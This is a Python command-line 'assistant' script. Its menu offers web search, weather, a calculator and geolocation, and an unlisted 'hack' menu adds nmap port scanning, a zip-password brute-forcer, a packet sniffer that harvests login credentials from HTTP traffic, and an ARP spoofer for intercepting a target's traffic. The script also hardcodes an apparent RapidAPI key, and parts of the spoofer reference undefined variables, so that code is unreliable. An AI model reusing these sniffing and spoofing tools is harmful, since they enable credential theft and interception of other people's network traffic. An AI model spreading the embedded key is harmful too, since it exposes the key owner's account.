import webbrowser
import wikipedia
import datetime
import time
import requests
from pprintpp import pprint
from geopy.geocoders import Nominatim
from geopy.distance import geodesic
from datetime import date
import nmap
import os
from pythonping import ping
import zipfile
from tqdm import tqdm
import scapy.all as scapy
from scapy.layers import http
#todo
#Take urls and print them out in the command line
#display text on pages e.g. wiki or google
#be more accurate
#Speech recognition
#reminders (calender or  "you have an appointment in 10 min")
#convert miles to km
#nmap and other hacking tools
current_time = datetime.datetime.now()


def question():
    print('\n\nThe commands which you can use are:')
    print('\nTurn off')
    print('Search')
    print('Time')
    print('Calculator')
    print('Weather')
    print("Date")
    print("Geo")
    first_menu_question = str(input('\nWhat do you want me to do?     ').lower())

    if first_menu_question == 'turn off':
        print('\n\nThank you for using me')
        print('\nTurning off')
        
    elif first_menu_question == 'search':
        
        def search_menu():
            print('\n\nThe commands in this sub category are:')
            print('Videos, Movies, Anime, Maps, Wiki, Back')
            specific = str(input('\nPlease enter a command:   ').lower())
            
            if specific == "videos":
                ask = input("what videos do you want to search?     ")
                search = ask.replace(" ","+")
                tubi = ask.replace(" ", "%20")
                webbrowser.open('https://www.youtube.com/results?search_query=' + search)
                search_menu()
                
            elif specific == "movies":
                ask = input("what movies do you want to search?     ")
                search = ask.replace(" ","+")
                tubi = ask.replace(" ", "%20")
                webbrowser.open('https://www2.solarmovie.to/search/' + search + '.html')
                search_menu()
                
            elif specific == "anime":
                ask = input("what anime do you want to search?     ")
                search = ask.replace(" ","+")
                tubi = ask.replace(" ", "%20")
                webbrowser.open('https://tubitv.com/search/' + tubi)
                webbrowser.open('https://www12.9anime.to/search?keyword=' + search)
                search_menu()
                
            elif specific == "maps":
                ask = input("what location do you want to search?     ")
                search = ask.replace(" ","+")
                tubi = search.replace(" ", "%20")
                webbrowser.open('https://www.google.com/maps/place/' + tubi)
                search_menu()

                
            elif specific == "wiki":
                ask = input("what information do you want to search?     ")
                print (wikipedia.summary(ask, sentences=2))
                search_menu()
                
            elif specific == "back":
                print("\n\nGoing to the previous menu")
                question()
                
            else:
                print("\n\nEroor: No such command found, please use one of the provided ones!")
                search_menu()
        
        search_menu()
    
    elif first_menu_question == 'date':
        today = date.today()
        print('\n\nThe date is ' + str(today.strftime("%B %d %Y")))      
        question()
              
        
    elif first_menu_question == 'time':
        print('\n\nRight now it is ' + str(current_time.hour) + ':' + str(current_time.minute))
        question()
        
    elif first_menu_question == 'calculator':
        
        def add(x, y):
            return x + y

    # This function subtracts two numbers
        def subtract(x, y):
            return x - y

        # This function multiplies two numbers
        def multiply(x, y):
            return x * y
        
        # This function divides two numbers
        def divide(x, y):
            return x / y


        print("Select operation.")
        print("1.Add")
        print("2.Subtract")
        print("3.Multiply")
        print("4.Divide")
           
    # Take input from the user
        choice = input("Enter choice(1/2/3/4): ")

    # Check if choice is one of the four options
        if choice in ('1', '2', '3', '4'):
            num1 = float(input("\nEnter first number: "))
            num2 = float(input("Enter second number: "))

            if choice == '1':
                print(num1, "+", num2, "=", add(num1, num2))
                question()

            elif choice == '2':
                print(num1, "-", num2, "=", subtract(num1, num2))
                question()

            elif choice == '3':
                print(num1, "*", num2, "=", multiply(num1, num2))
                question()

            elif choice == '4':
                print(num1, "/", num2, "=", divide(num1, num2))
                question()
            else:
                print("Invalid Input")            
                question()
                
    elif first_menu_question == 'geo':
        print('The format should look like this: HOUSE_NUMBER STREET STATE_CODE')
        geolocator = Nominatim(user_agent='/home/pi/Desktop/MultiTool.py')
        my_geo_place = input('what is your location?     ')
        my_loc = geolocator.geocode(my_geo_place)
        my_cor = (my_loc.latitude, my_loc.longitude) 
        geo_place = input('What are you looking for?     ')
        target_loc = geolocator.geocode(geo_place)
        target_cor = (target_loc.latitude, target_loc.longitude)
        print(str("The distance from your location, to your target location in Kilometers, is " + str(geodesic(my_cor, target_cor).km)))
        tubi = geo_place.replace(" ", "%20")
        tubi2 = my_geo_place.replace(" ", "%20")
        webbrowser.open('https://www.google.com/maps/place/' + tubi)
        webbrowser.open('https://www.google.com/maps/place/' + tubi2)
        question()
        
        
    elif first_menu_question == 'weather':
        city = input("\nWhat city?   ")
        country_code = input("\nWhat is the country code?   ")
        url = "https://community-open-weather-map.p.rapidapi.com/weather"
        querystring = {"q" : city + "," + country_code}
        headers = {
            'x-rapidapi-key' : "ac1271b3cbmshc79ff8ef87eec42p1a74fdjsn484ef4eaee4a",
            'x-rapidapi-host' : "community-open-weather-map.p.rapidapi.com"
            }
        response = requests.request("GET", url, headers = headers, params = querystring)
        data = response.json()
        
        temp = data['main']['temp']
        c_to_k_temp = temp - 273.15
        floated = "{:.2f}".format(c_to_k_temp)
        degree_sign = u"\N{DEGREE SIGN}"
        wind_speed = data['wind']['speed']
        km_to_m = wind_speed * 2.921406
        lat = data["coord"]['lat']
        lon = data['coord']['lon']
        
        description = data['weather'][0]['description']
        
        print('\nIn ' + city + ' it is around ' + str(floated) + degree_sign + 'C')
        print('Overall the description is:  ' + description)
        print('The wind speed is around' + str(km_to_m) + "km/hour")
        print('The city is located on he coordinates: ' + str(lat) + '  ' + str(lon))
        question()         
        
    elif first_menu_question == 'hack':
        
        def hack_menu():
            print("\n\n\n\n\nPlease choses one of the option below:")
            print("\n\n1)Ip scanner")
            print("2)Network Scanner")
            print("3)Ping")
            print("4)Zip File Bruteforcer")
            print("5)Packet Sniffer")
            print("6)ARP Spoofer")
            print("0)Back")
            hack_answer = input("\n\nPlease enter your choice:   ")
            
            
            if hack_answer == "1":
                
                scanner = nmap.PortScanner()
                print("""
            
             /$$$$$$$  /$$$$$$$$ /$$    /$$$$$$$$ /$$$$$$ 
            | $$__  $$| $$_____/| $$   |__  $$__//$$__  $$
            | $$  \ $$| $$      | $$      | $$  | $$  \ $$
            | $$  | $$| $$$$$   | $$      | $$  | $$$$$$$$
            | $$  | $$| $$__/   | $$      | $$  | $$__  $$
            | $$  | $$| $$      | $$      | $$  | $$  | $$
            | $$$$$$$/| $$$$$$$$| $$$$$$$$| $$  | $$  | $$
            |_______/ |________/|________/|__/  |__/  |__/
                                                                  
                                                                              
                                              

                """)
                print("\n\n\n                 Welcom to the simple Ip Scanner")
                print("\n<--------------------------------------------------------------->")
                
                ip_addr = input("\nPlease enter the IP address you want to scan: ")
                print("\nTarget Ip set to: ", ip_addr)
                type(ip_addr)
                
                ip_menu = input("""\nPlease enter the type of scan you want to run:
1)SYN ACK Scan
2)UDP Scan
3)Comprehensive Scan
0)Back
                                    
Your choice:  """)
                
                print("OPTION was set to: ", ip_menu)
                
                if ip_menu == "1":
                    print("\n\nNmap Version: ", scanner.nmap_version())
                    ports_to_scan = input("Please enter the port numbers which you want to scan\nIf you want to scan every port up until 1024, type ALL:    ").lower()
                    if ports_to_scan == 'all':
                        scanner.scan(ip_addr, '1-1024', '-v -sS')
                        print(scanner.scaninfo())
                        print("Ip Status: ", scanner[ip_addr].state())
                        print(scanner[ip_addr].all_protocols())
                        print("Open Ports: ", scanner[ip_addr]['tcp'].keys())
                        hack_menu()
                    else:
                        scanner.scan(ip_addr, ports_to_scan, '-v -sS')
                        print(scanner.scaninfo())
                        print("Ip Status: ", scanner[ip_addr].state())
                        print(scanner[ip_addr].all_protocols())
                        print("Open Ports: ", scanner[ip_addr]['tcp'].keys())
                        hack_menu()
                elif ip_menu == "2":
                    print("\n\nNmap Version: ", scanner.nmap_version())
                    ports_to_scan = input("Please enter the port numbers which you want to scan\nIf you want to scan every port up until 1024, type ALL:    ").lower()
                    if ports_to_scan == 'all':
                        scanner.scan(ip_addr, '1-1024', '-v -sU')
                        print(scanner.scaninfo())
                        print("Ip Status: ", scanner[ip_addr].state())
                        print(scanner[ip_addr].all_protocols())
                        print("Open Ports: ", scanner[ip_addr]['udp'].keys())
                        hack_menu()
                    else:
                        scanner.scan(ip_addr, ports_to_scan, '-v -sU')
                        print(scanner.scaninfo())
                        print("Ip Status: ", scanner[ip_addr].state())
                        print(scanner[ip_addr].all_protocols())
                        print("Open Ports: ", scanner[ip_addr]['udp'].keys())
                        hack_menu()
                elif ip_menu == "3":
                    print("\n\nNmap Version: ", scanner.nmap_version())
                    ports_to_scan = input("\nPlease enter the port numbers which you want to scan\nIf you want to scan every port up until 1024, type ALL:    ").lower()
                    if ports_to_scan == 'all':
                        scanner.scan(ip_addr, '1-1024', '-v -sS -sV -sC -A -O')
                        print(scanner.scaninfo())
                        print("Ip Status: ", scanner[ip_addr].state())
                        print(scanner[ip_addr].all_protocols())
                        print("Open Ports: ", scanner[ip_addr]["tcp"].keys())
                        hack_menu()
                    else:
                        scanner.scan(ip_addr, ports_to_scan, '-v -sS -sV -sC -A -O')
                        print(scanner.scaninfo())
                        print("Ip Status: ", scanner[ip_addr].state())
                        print(scanner[ip_addr].all_protocols())
                        print("Open Ports: ", scanner[ip_addr]["tcp"].keys())
                        hack_menu()
                elif ip_menu == "0":
                    
                    hack_menu()
                
                else:
                    print("\n\n Invalid Choice: Please use one of the choices provided")
                    hack_menu()
            
            elif hack_answer == "2":
                print("\n\nPlease specify your routers ip, It might be on of these: ")
                print("\n\n" + os.popen('route -n ').read())
                router_ip = input("\n\nInput routers IP:   ")
                def scan(ip):
                    print("\n These are the MAC Ads. linked with the IP's on the network:  \n")
                    scapy.arping(ip)              
                
                scan(router_ip + "/24")
                hack_menu()
            
            elif hack_answer == "3":
                ip_address = input("\n\nPlease enter what you want to ping:  ")
                ping(ip_address, verbose=True, size=40, count=10)
                hack_menu()
                
            elif hack_answer == '4':
                wordlist = str(input("Enter the full path of the WORDLIST which you want to use:  "))
                zip_file = str(input("Enter the full path of the Zip File which you want to crack:   "))
                zip_file = zipfile.ZipFile(zip_file)
                n_words = len(list(open(wordlist, "rb")))
                print("Total passwords to test:", n_words)
                with open(wordlist, "rb") as wordlist:
                    for word in tqdm(wordlist, total=n_words, unit="word"):
                        try:
                            zip_file.extractall(pwd=word.strip())
                        except:
                            continue
                        else:
                            print("[+] Password found:", word.decode().strip())
                            hack_menu()
                print("[!] Password not found, try other wordlist.")
                
                hack_menu()
                             
            elif hack_answer == "5":
                what_inter = str(input("Specify what interface you want to use:  "))
                what_filter = str(input("Specify what filter you want to use (port 22, port 21, udp, http, ect.):   "))
                
                if what_filter == "http":
                    what_find = input("What do you want to catch? (login, url, all):   ").lower()
                    
                    if what_find == "login":
                        try:
                            def sniff(interface):
                                scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
                            
                            def process_sniffed_packet(packet):
                                if packet.haslayer(http.HTTPRequest):
                                    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
                                    print("[+]HTTP Request --> " + str(url))
                                    if packet.haslayer(scapy.Raw):
                                        load = str(packet[scapy.Raw].load)
                                        keywords = ["uname", "pass", "username", "password", "login"]
                                        for keyword in keywords:
                                            if keyword in load:
                                                print("\n\n[+]Possible username and passowrd --> " + str(load) + "\n\n")
                                        
                                 
                            sniff(what_inter)
                        
                        except KeyboardInterrupt:
                            print("\n[+] Detected CTRL + C ......... Quitting ")
                                
                    elif what_find == "all":
                        
                        try:
                            def sniff(interface):
                                scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
                            
                            def process_sniffed_packet(packet):
                                if packet.haslayer(http.HTTPRequest):
                                    print(packet.load)
                         
                            sniff(what_inter)
                        
                        except KeyboardInterrupt:
                            print("\n[+] Detected CTRL + C ......... Quitting ")
                    else:
                        print("\n\nInvalid input, Please use one of the ones provided!")
                        hack_menu()
                        
                        
                    
                else:
                    what_find = input("What do you want to catch? (login, all):   ").lower()
                    if what_find == "login":
                        try:
                            def sniff(interface):
                                scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter=what_filter)
                        
                            def process_sniffed_packet(packet):
                                    if packet.haslayer(scapy.Raw):
                                        load = str(packet[scapy.Raw])
                                        keywords = ["uname", "pass", "username", "password", "login"]
                                        for keyword in keywords:
                                            if keyword in load:
                                                print("\n\n" + load)
                            
                            sniff(what_inter)

                        except KeyboardInterrupt:
                            print("\n[+] Detected CTRL + C ......... Quitting ")
                                
                    elif what_find == "all":                                     
                        try:
                            def sniff(interface):
                                scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter=what_filter)
                        
                            def process_sniffed_packet(packet):
                                print(packet.show)
                                 
                            sniff(what_inter)
                    
                        except KeyboardInterrupt:
                            print("\n[+] Detected CTRL + C ......... Quitting ")
                    
                    else:
                        print("\n\nInvalid input, Please use one of the ones provided!")
                        hack_menu()
                                     
            elif hack_answer =="6":
                
                
                print("\n\n Run the Network Scanner to find Devices on the same network")
                target_ip = (input("\nPlease enter the target ip:  "))
                spoof_ip = (input("Please enter the IP of the router:  "))
                
                sent_packets_count = 0
                def get_mac(ip):
                    arp_request = scapy.ARP(pdst=ip)
                    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
                    arp_request_broadcast = broadcast/arp_request
                    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
                    
                    answered_list[0][1].hwsrc
                    
                    clients_list = []
                    for element in answered_list:
                        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
                        clients_list.append(client_dict)
                    return clients_list
                    
                
                def spoof(target_ip, spoof_ip):
                    target_mac = get_mac(target_ip)
                    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
                    scapy.send(str(packet), verbose=False)                   
                    
                def restore(destination_ip, source_ip):
                    destination_mac = get_mac(destination_ip)
                    source_mac = get_mac(source_ip)
                    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
                    scapy.send(packet, count=4, verbose=False)
                
                try:
                    while True:
                        spoof(target_ip, spoof_ip)
                        spoof(spoof_ip, target_ip)
                        scapy.send(packet2, verbose=False)
                        sent_packets_count = sent_packets_count + 2
                        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
                        time.sleep(2)
                    
                except KeyboardInterrupt:
                    print("\n[+] Detected CTRL + C ............ Resetting ARP tables... Please wait")
                    restore(target_ip, gateway_ip)
                    restore(gateway_ip, target_ip)
                    scapy.send(packet_restore2, count=4, verbose=False)
                    print("[+] Tables Restored")
                    hack_menu()
                    
                hack_menu()
                
            elif hack_answer == "0":
                
                question()
                
            else:
                print("\n\n Invalid Choice: Please use one of the choices provided")
                hack_menu()
                
                
        hack_menu()
            
    else:
        print("\nThe command you have inputed doesn't exist\n\nPlease use of the provided commands!")
        question()
        
question()